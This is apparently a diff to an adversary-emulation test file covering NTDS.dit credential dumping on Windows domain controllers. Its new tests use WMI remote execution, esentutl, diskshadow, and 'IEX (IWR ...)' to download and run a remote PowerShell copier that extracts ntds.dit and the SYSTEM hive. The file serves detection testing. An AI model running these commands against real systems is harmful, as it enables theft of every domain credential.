@@ -12,7 +12,7 @@ atomic_tests:
   input_arguments:
     drive_letter:
       description: Drive letter to source VSC (including colon)
-      type: String
+      type: string
       default: 'C:'
   dependencies:
   - description: |
@@ -42,11 +42,11 @@ atomic_tests:
   input_arguments:
     vsc_name:
       description: Name of Volume Shadow Copy
-      type: String
+      type: string
       default: '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1'
     extract_path:
       description: Path for extracted NTDS.dit
-      type: Path
+      type: path
       default: C:\Windows\Temp
   dependencies:
   - description: |
@@ -60,7 +60,7 @@ atomic_tests:
     prereq_command: |
       if not exist #{vsc_name} (exit /b 1)
     get_prereq_command: |
-      echo Run "Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vassadmin'" to fulfuill this requirement
+      echo Run "Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'" to fulfill this requirement
   - description: |
       Extract path must exist
     prereq_command: |
@@ -94,7 +94,7 @@ atomic_tests:
   input_arguments:
     output_folder:
       description: Path where resulting dump should be placed
-      type: Path
+      type: path
       default: C:\Windows\Temp\ntds_T1003
   dependencies:
   - description: |
@@ -122,9 +122,9 @@ atomic_tests:
   - windows
   input_arguments:
     drive_letter:
-      description: Drive letter to source VSC (including colon)
-      type: String
-      default: 'C:'
+      description: Drive letter to source VSC (including colon and backslash)
+      type: string
+      default: 'C:\'
   dependencies:
   - description: |
       Target must be a Domain Controller
@@ -135,6 +135,68 @@ atomic_tests:
   executor:
     command: |
       wmic shadowcopy call create Volume=#{drive_letter}
+    name: command_prompt
+    elevation_required: true
+
+- name: Create Volume Shadow Copy remotely with WMI
+  auto_generated_guid: d893459f-71f0-484d-9808-ec83b2b64226
+  description: |
+    This test is intended to be run from a remote workstation with domain admin context.
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+  supported_platforms:
+  - windows
+  input_arguments:
+    drive_letter:
+      description: Drive letter to source VSC (including colon and backslash)
+      type: string
+      default: 'C:\'
+    target_host:
+      description: IP Address / Hostname you want to target
+      type: string
+      default: localhost
+  dependencies:
+  - description: |
+      Target must be a reachable Domain Controller, and current context must be domain admin
+    prereq_command: |
+      wmic /node:"#{target_host}" shadowcopy list brief
+    get_prereq_command: |
+      echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
+  executor:
+    command: |
+      wmic /node:"#{target_host}" shadowcopy call create Volume=#{drive_letter}
+    name: command_prompt
+    elevation_required: true
+
+- name: Create Volume Shadow Copy remotely (WMI) with esentutl
+  auto_generated_guid: 21c7bf80-3e8b-40fa-8f9d-f5b194ff2865
+  description: |
+    This test is intended to be run from a remote workstation with domain admin context.
+    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.
+  supported_platforms:
+  - windows
+  input_arguments:
+    source_path:
+      description: File to shadow copy
+      type: string
+      default: 'c:\windows\ntds\ntds.dit'
+    target_path:
+      description: Target path of the result file
+      type: string
+      default: 'c:\ntds.dit'
+    target_host:
+      description: IP Address / Hostname you want to target
+      type: string
+      default: localhost
+  dependencies:
+  - description: |
+      Target must be a reachable Domain Controller, and current context must be domain admin
+    prereq_command: |
+      wmic /node:"#{target_host}" shadowcopy list brief
+    get_prereq_command: |
+      echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
+  executor:
+    command: |
+      wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}"
     name: command_prompt
     elevation_required: true
 
@@ -149,14 +211,19 @@ atomic_tests:
   input_arguments:
     drive_letter:
       description: Drive letter to source VSC (including colon)
-      type: String
-      default: 'C:'
+      type: string
+      default: 'C:\'
   executor:
     command: |
-      (gwmi -list win32_shadowcopy).Create(#{drive_letter},'ClientAccessible')
+      $r = (gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')
+      $Shadow_Id =  $r.ShadowId
+      Set-Content -Path "$env:TEMP/shadow_id.txt" -Value "$Shadow_Id"
+    cleanup_command: |
+      $Shadow_Id = Get-Content -Path "$env:TEMP/shadow_id.txt"
+      vssadmin delete shadows /shadow=$Shadow_Id /quiet
+      Remove-Item "$env:TEMP/shadow_id.txt" -Force -ErrorAction SilentlyContinue
     name: powershell
     elevation_required: true
-
 - name: Create Symlink to Volume Shadow Copy
   auto_generated_guid: 21748c28-2793-4284-9e07-d6d028b66702
   description: |
@@ -168,11 +235,11 @@ atomic_tests:
   input_arguments:
     drive_letter:
       description: Drive letter to source VSC (including colon)
-      type: String
+      type: string
       default: 'C:'
     symlink_path:
       description: symlink path
-      type: String
+      type: string
       default: 'C:\Temp\vssstore'
   executor:
     command: |
@@ -180,3 +247,79 @@ atomic_tests:
       mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
     name: command_prompt
     elevation_required: true
+
+- name: Create Volume Shadow Copy with diskshadow
+  auto_generated_guid: b385996c-0e7d-4e27-95a4-aca046b119a7
+  description: |
+    This test is intended to be run on a domain controller
+    An alternative to using vssadmin to create a Volume Shadow Copy for extracting ntds.dit
+  supported_platforms:
+  - windows
+  input_arguments: 
+    filename:
+      description: Location of the script
+      type: Path
+      default: PathToAtomicsFolder\T1003.003\src\diskshadow.txt
+  executor:
+    command: |
+      mkdir c:\exfil
+      diskshadow.exe /s #{filename}
+    name: command_prompt
+    elevation_required: true
+- name: Copy NTDS in low level NTFS acquisition via MFT parsing
+  auto_generated_guid: f57cb283-c131-4e2f-8a6c-363d575748b2
+  description: |
+    This test is intended to be run on a domain Controller.
+
+    UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running).
+  supported_platforms:
+    - windows
+  input_arguments:
+    extract_path:
+      type: string
+      default: C:\Windows\Temp
+      description: Path for extracted NTDS.dit
+    script_url:
+      description: URL to UnderlayCopy script
+      type: url
+      default: https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR #{script_url} -UseBasicParsing)
+      Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
+      Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
+    name: powershell
+    elevation_required: true
+    cleanup_command: |
+      remove-item "#{extract_path}\ntds.dit" -force -erroraction silentlycontinue
+      remove-item "#{extract_path}\SYSTEM_HIVE" -force -erroraction silentlycontinue
+
+- name: Copy NTDS in low level NTFS acquisition via fsutil
+  auto_generated_guid: c7be89f7-5d06-4321-9f90-8676a77e0502
+  description: |
+    This test is intended to be run on a domain Controller.
+
+    UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry hives, and other files that are normally inaccessible while Windows is running).
+  supported_platforms:
+    - windows
+  input_arguments:
+    extract_path:
+      type: string
+      default: C:\Windows\Temp
+      description: Path for extracted NTDS.dit
+    script_url:
+      description: URL to UnderlayCopy script
+      type: url
+      default: https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR #{script_url} -UseBasicParsing)
+      Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
+      Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
+    name: powershell
+    elevation_required: true
+    cleanup_command: |
+      remove-item "#{extract_path}\ntds.dit" -force -erroraction silentlycontinue
+      remove-item "#{extract_path}\SYSTEM_HIVE" -force -erroraction silentlycontinue
